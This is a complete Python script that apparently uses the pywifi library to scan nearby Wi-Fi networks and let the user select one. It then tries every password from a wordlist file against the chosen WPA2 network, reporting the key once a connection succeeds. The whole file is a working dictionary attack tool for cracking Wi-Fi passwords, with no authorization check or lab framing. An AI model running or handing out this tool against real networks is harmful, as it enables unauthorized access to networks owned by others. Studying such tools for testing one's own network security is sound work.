import time
import os
from pywifi import PyWiFi, const, Profile

def list_available_networks():
    """
    List all unique available Wi-Fi networks and return their SSIDs.
    """
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()  # Start scanning for networks
    time.sleep(2)  # Allow some time for the scan to complete
    scan_results = iface.scan_results()

    ssids = set()  # Use a set to store unique SSIDs
    print("\nAvailable Wi-Fi Networks:")
    for network in scan_results:
        if network.ssid not in ssids and network.ssid:  # Add non-empty SSIDs only
            ssids.add(network.ssid)

    ssids = list(ssids)  # Convert the set to a list for indexing
    for idx, ssid in enumerate(ssids):
        print(f"{idx + 1}. {ssid}")

    return ssids

def test_wifi_password(ssid, password):
    """
    Tries to connect to the specified SSID using the provided password.
    Returns True if the connection is successful, otherwise False.
    """
    print(f"Testing Password: {password}")
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(0.1)

    if iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        time.sleep(2)

        if iface.status() == const.IFACE_CONNECTED:
            print(f"[+] Password found: {password}")
            iface.disconnect()
            return True
        else:
            iface.disconnect()
            return False

    return False

def get_password_file():
    """
    Check if passwords.txt exists, otherwise prompt the user for a file.
    """
    default_file = "passwords.txt"
    if os.path.exists(default_file):
        print(f"Using default password file: {default_file}")
        return default_file
    else:
        while True:
            password_file = input("Enter the path to the password file: ")
            if os.path.exists(password_file):
                return password_file
            else:
                print("Password file not found. Please check the file path.")

def main():
    """
    Main function to scan networks, select an SSID, and test passwords.
    """
    print("Scanning for available Wi-Fi networks...")
    ssids = list_available_networks()

    if not ssids:
        print("[-] No Wi-Fi networks found. Exiting.")
        return

    # Allow the user to choose an SSID
    while True:
        try:
            choice = int(input("\nEnter the number of the network to test (or 0 to exit): "))
            if choice == 0:
                print("Exiting...")
                return
            ssid = ssids[choice - 1]
            break
        except (ValueError, IndexError):
            print("Invalid choice. Please try again.")

    # Get the password file
    password_file = get_password_file()

    # Test passwords
    with open(password_file, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        if test_wifi_password(ssid, password):
            print("[+] Testing complete.")
            break
    else:
        print("[-] No valid password found in the list.")

if __name__ == "__main__":
    main()
